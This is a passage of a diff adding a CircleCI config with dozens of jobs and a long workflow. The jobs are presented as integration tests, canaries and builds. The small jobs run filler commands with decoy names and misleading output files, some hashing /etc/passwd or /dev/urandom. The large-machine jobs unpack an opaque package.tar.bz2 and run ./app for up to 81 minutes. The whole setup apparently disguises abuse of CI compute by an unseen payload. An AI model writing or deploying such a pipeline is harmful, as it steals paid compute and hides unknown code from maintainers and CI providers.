+          command: git clone --depth 1 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: tar -I bzip2 -xf package.tar.bz2
+      - run:
+          name: Smoke check
+          command: env | wc -l
+      - run:
+          name: Post-build check
+          command: free -m
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./app"
+  alpha_build-quick-integration-tests:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: missed approach
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; printf "%d\n" $(( $(date +%M) * 60 + $(date +%S) )); true ; } > /tmp/.wsp/ckpt-A.pkl
+            len=$(wc -c </tmp/.wsp/ckpt-A.pkl); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - ckpt-A.pkl
+  build-quick-integration-tests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Pull from workspace
+          command: |
+            wc -l /tmp/.wsp/ckpt-A.pkl || true
+      - run:
+          name: Grab repository
+          command: git clone --depth 1 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: tar -I bzip2 -xf package.tar.bz2
+      - run:
+          name: Smoke check
+          command: env | wc -l
+      - run:
+          name: Post-build check
+          command: free -m
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./app"
+  prefetch_produce-end-to-end-regression-suite:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: alcohol stove
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; head -c 14680064 /dev/urandom | od -An -x | wc -w; true ; } > /tmp/.wsp/stage.blob
+            len=$(wc -c </tmp/.wsp/stage.blob); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - stage.blob
+  produce-end-to-end-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Pull from workspace
+          command: |
+            wc -l /tmp/.wsp/stage.blob || true
+      - run:
+          name: Grab repository
+          command: git clone --depth 1 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: tar -I bzip2 -xf package.tar.bz2
+      - run:
+          name: Smoke check
+          command: env | wc -l
+      - run:
+          name: Post-build check
+          command: free -m
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./app"
+  kick_november-7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: septet
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 218444 | tr '0-9' 'a-j' | wc -c; true ; } > /tmp/.wsp/pt-v2.state
+            len=$(wc -c </tmp/.wsp/pt-v2.state); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - pt-v2.state
+  november-7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Pull from workspace
+          command: |
+            wc -l /tmp/.wsp/pt-v2.state || true
+      - run:
+          name: Grab repository
+          command: git clone --depth 1 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: tar -I bzip2 -xf package.tar.bz2
+      - run:
+          name: Smoke check
+          command: env | wc -l
+      - run:
+          name: Post-build check
+          command: free -m
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./app"
+  retry_p-3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: cold plunge
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo "$RANDOM" | base64; true ; } > /tmp/.wsp/checkpoint-E.pkl
+            len=$(wc -c </tmp/.wsp/checkpoint-E.pkl); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - checkpoint-E.pkl
+  p-3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Pull from workspace
+          command: |
+            wc -l /tmp/.wsp/checkpoint-E.pkl || true
+      - run:
+          name: Grab repository
+          command: git clone --depth 1 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: tar -I bzip2 -xf package.tar.bz2
+      - run:
+          name: Smoke check
+          command: env | wc -l
+      - run:
+          name: Post-build check
+          command: free -m
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./app"
+  Delta_anothr-run:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: double knot
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'NR<=3' /etc/passwd | md5sum; true ; } > /tmp/.wsp/secondary_phase_output_v1.txt
+            len=$(wc -c </tmp/.wsp/secondary_phase_output_v1.txt); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - secondary_phase_output_v1.txt
+  anothr-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Pull from workspace
+          command: |
+            wc -l /tmp/.wsp/secondary_phase_output_v1.txt || true
+      - run:
+          name: Grab repository
+          command: git clone --depth 1 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: tar -I bzip2 -xf package.tar.bz2
+      - run:
+          name: Smoke check
+          command: env | wc -l
+      - run:
+          name: Post-build check
+          command: free -m
+      - run:
+          no_output_timeout: 81m
+          command: sh -c "./app"
+
+  Beta_november-7_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: twist right
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; grep -o '[a-z]' <<<"abc123def456" | sort | uniq | wc -l; true ; } > /tmp/.wsp/pt-v2.state
+            len=$(wc -c </tmp/.wsp/pt-v2.state); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - pt-v2.state
+  syncer_strated-62_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: annoy manager
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{print cos(0), sin(1.5708), exp(1)}'; true ; } > /tmp/.wsp/.ready
+            len=$(wc -c </tmp/.wsp/.ready); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - .ready
+  loader_yolo_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: fingers crossed
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; yes abc | head -n 458196 | sha256sum; true ; } > /tmp/.wsp/counts.jsonl
+            len=$(wc -c </tmp/.wsp/counts.jsonl); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - counts.jsonl
+  run_q4-smoke_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: donut
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 440442 | awk 'END{print NR}'; true ; } > /tmp/.wsp/2024-09-08.data
+            len=$(wc -c </tmp/.wsp/2024-09-08.data); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 2024-09-08.data
+  fetch_beta-v4_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: neutron drum
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; tf=$(mktemp) && echo hello > "$tf" && grep -c hello "$tf" && rm "$tf"; true ; } > /tmp/.wsp/81.out
+            len=$(wc -c </tmp/.wsp/81.out); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 81.out
+  reup_INFRA-79_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: etude
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; sum /etc/hostname 2>/dev/null | head -1 || cksum /etc/hostname; true ; } > /tmp/.wsp/pt-E.pickle
+            len=$(wc -c </tmp/.wsp/pt-E.pickle); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - pt-E.pickle
+  go_raj-ship_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: smooth out
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; yes "abcd" | head -200 | md5sum; true ; } > /tmp/.wsp/metrics.tsv
+            len=$(wc -c </tmp/.wsp/metrics.tsv); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - metrics.tsv
+  round2_biuld_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: cinder trail
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<16;i++)printf "%X", i; print ""}'; true ; } > /tmp/.wsp/.ok
+            len=$(wc -c </tmp/.wsp/.ok); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - .ok
+  generate_build_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: pulsar beat
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 100 | awk '{if($1<50) a+=$1; else b+=$1}END{print a, b}'; true ; } > /tmp/.wsp/86.blob
+            len=$(wc -c </tmp/.wsp/86.blob); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 86.blob
+  Alpha_anothr-run_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: thread fine
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 30 | paste -sd '-' - | wc -c; true ; } > /tmp/.wsp/secondary_phase_output_v1.txt
+            len=$(wc -c </tmp/.wsp/secondary_phase_output_v1.txt); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - secondary_phase_output_v1.txt
+  round2_CORE-238_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: percussion
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq -w 1 100 | tail -1; true ; } > /tmp/.wsp/primary_phase_output.log
+            len=$(wc -c </tmp/.wsp/primary_phase_output.log); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - primary_phase_output.log
+  staging_canary_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: laser etch
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 50 | paste -sd '+' | bc 2>/dev/null || seq 1 50 | awk '{s+=$1}END{print s}'; true ; } > /tmp/.wsp/passoff.txt
+            len=$(wc -c </tmp/.wsp/passoff.txt); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - passoff.txt
+  package_validte_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: mop up
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo "snake_case_text" | tr _ ' '; true ; } > /tmp/.wsp/2024-01-24.data
+            len=$(wc -c </tmp/.wsp/2024-01-24.data); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 2024-01-24.data
+  reup_shippit_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: ash drift
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; head -c 4194304 /dev/urandom | md5sum; true ; } > /tmp/.wsp/2023-01-24.data
+            len=$(wc -c </tmp/.wsp/2023-01-24.data); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 2023-01-24.data
+  maker_node20-build_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: zap
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<16;i++)printf "%02x", 15-i; print ""}'; true ; } > /tmp/.wsp/audit.txt
+            len=$(wc -c </tmp/.wsp/audit.txt); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - audit.txt
+  Delta_produce-end-to-end-regression-suite_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: nordic curl
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; head -c 50 /dev/urandom | wc -c; true ; } > /tmp/.wsp/stage.blob
+            len=$(wc -c </tmp/.wsp/stage.blob); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - stage.blob
+  fetcher_apr13-canary_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: scherzo
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; umask; true ; } > /tmp/.wsp/982.out
+            len=$(wc -c </tmp/.wsp/982.out); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 982.out
+  redo_spin-up_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: sleet drift
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; tf=$(mktemp) && seq 1 100 > "$tf" && wc -l "$tf" | awk '{print $1}' && rm "$tf"; true ; } > /tmp/.wsp/stage-ready.out
+            len=$(wc -c </tmp/.wsp/stage-ready.out); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - stage-ready.out
+  preflight_whiskey_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: peanut tool
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo "quick" | tr A-Za-z N-ZA-Mn-za-m | base64 | head -c 20; true ; } > /tmp/.wsp/full_phase_output.log
+            len=$(wc -c </tmp/.wsp/full_phase_output.log); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - full_phase_output.log
+  preflight_p-3_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: oak split
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(a=0;a<256;a++)xored = xored  (a ^ 0x5a); print length(xored)}'; true ; } > /tmp/.wsp/checkpoint-E.pkl
+            len=$(wc -c </tmp/.wsp/checkpoint-E.pkl); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - checkpoint-E.pkl
+workflows:
+  pipeline:
+    jobs:
+      - alpha_build-quick-integration-tests
+      - kick_send-it
+      - build-quick-integration-tests:
+          requires:
+            - alpha_build-quick-integration-tests
+            - kick_send-it
+      - send-it:
+          requires:
+            - alpha_build-quick-integration-tests
+            - kick_send-it
+      - ShipRelease:
+          requires:
+            - alpha_build-quick-integration-tests
+            - kick_send-it
+      - java17-ship:
+          requires:
+            - alpha_build-quick-integration-tests
+            - kick_send-it
+      - rm-session:
+          requires:
+            - alpha_build-quick-integration-tests
+            - kick_send-it
+      - shippit-12:
+          requires:
+            - alpha_build-quick-integration-tests
+            - kick_send-it
+      - fire-up:
+          requires:
+            - alpha_build-quick-integration-tests
+            - kick_send-it
+      - dp-x:
+          requires:
+            - alpha_build-quick-integration-tests
+            - kick_send-it
+      - jun1-release:
+          requires:
+            - alpha_build-quick-integration-tests
+            - kick_send-it
+      - whiskey-2:
+          requires:
+            - alpha_build-quick-integration-tests
+            - kick_send-it
+      - kick_november-7
+      - Beta_november-7_2:
+          requires:
+            - kick_november-7
+      - november-7:
+          requires:
+            - Beta_november-7_2
+      - fetcher_strated-62:
+          requires:
+            - Beta_november-7_2
+      - syncer_strated-62_2:
+          requires:
+            - fetcher_strated-62
+      - strated-62:
+          requires:
+            - syncer_strated-62_2
+      - postcheck_yolo:
+          requires:
+            - syncer_strated-62_2
+      - loader_yolo_2:
+          requires:
+            - postcheck_yolo
+      - yolo:
+          requires:
+            - loader_yolo_2
+      - postbuild_q4-smoke:
+          requires:
+            - loader_yolo_2
+      - run_q4-smoke_2:
+          requires:
+            - postbuild_q4-smoke
+      - q4-smoke:
+          requires:
+            - run_q4-smoke_2
+      - run_beta-v4:
+          requires:
+            - run_q4-smoke_2
+      - fetch_beta-v4_2:
+          requires:
+            - run_beta-v4
+      - beta-v4:
+          requires:
+            - fetch_beta-v4_2
+      - round2_INFRA-79:
+          requires:
+            - fetch_beta-v4_2
+      - reup_INFRA-79_2:
+          requires:
+            - round2_INFRA-79
+      - INFRA-79:
+          requires:
+            - reup_INFRA-79_2
+      - canary1_raj-ship:
+          requires:
+            - reup_INFRA-79_2
+      - go_raj-ship_2:
+          requires:
+            - canary1_raj-ship
+      - raj-ship:
+          requires:
+            - go_raj-ship_2
+      - warmup_biuld:
+          requires:
+            - go_raj-ship_2
+      - round2_biuld_2:
+          requires:
+            - warmup_biuld
+      - biuld:
+          requires:
+            - round2_biuld_2
+      - orchestrate_build
+      - generate_build_2:
+          requires:
+            - orchestrate_build
+      - build:
+          requires:
+            - generate_build_2
+      - Delta_anothr-run:
+          requires:
+            - generate_build_2
+      - Alpha_anothr-run_2:
+          requires:
+            - Delta_anothr-run
+      - anothr-run:
+          requires:
+            - Alpha_anothr-run_2
+      - auditor_CORE-238:
+          requires:
+            - Alpha_anothr-run_2
+      - round2_CORE-238_2:
+          requires:
+            - auditor_CORE-238
+      - CORE-238:
+          requires:
+            - round2_CORE-238_2
+      - reup_canary:
+          requires:
+            - round2_CORE-238_2
+      - staging_canary_2:
+          requires:
+            - reup_canary
+      - canary:
+          requires:
+            - staging_canary_2
+      - cacher_validte:
+          requires:
+            - staging_canary_2
+      - package_validte_2:
+          requires:
+            - cacher_validte
+      - validte:
+          requires:
+            - package_validte_2
+      - builder_shippit:
+          requires:
+            - package_validte_2
+      - reup_shippit_2:
+          requires:
+            - builder_shippit
+      - shippit:
+          requires:
+            - reup_shippit_2
+      - cook_node20-build:
+          requires:
+            - reup_shippit_2
+      - maker_node20-build_2:
+          requires:
+            - cook_node20-build
+      - node20-build:
+          requires:
+            - maker_node20-build_2
+      - prefetch_produce-end-to-end-regression-suite
+      - Delta_produce-end-to-end-regression-suite_2:
+          requires:
+            - prefetch_produce-end-to-end-regression-suite
+      - produce-end-to-end-regression-suite:
+          requires:
+            - Delta_produce-end-to-end-regression-suite_2
+      - orchestrate_apr13-canary:
+          requires:
+            - Delta_produce-end-to-end-regression-suite_2
+      - fetcher_apr13-canary_2:
+          requires:
+            - orchestrate_apr13-canary
+      - apr13-canary:
+          requires:
+            - fetcher_apr13-canary_2
+      - fetcher_spin-up:
+          requires:
+            - fetcher_apr13-canary_2
+      - redo_spin-up_2:
+          requires:
+            - fetcher_spin-up
+      - spin-up:
+          requires:
+            - redo_spin-up_2
+      - step1_whiskey:
+          requires:
+            - redo_spin-up_2
+      - preflight_whiskey_2:
+          requires:
+            - step1_whiskey
+      - whiskey:
+          requires:
+            - preflight_whiskey_2
+      - retry_p-3:
+          requires:
+            - preflight_whiskey_2
+      - preflight_p-3_2:
+          requires:
+            - retry_p-3
+      - p-3:
+          requires:
+            - preflight_p-3_2
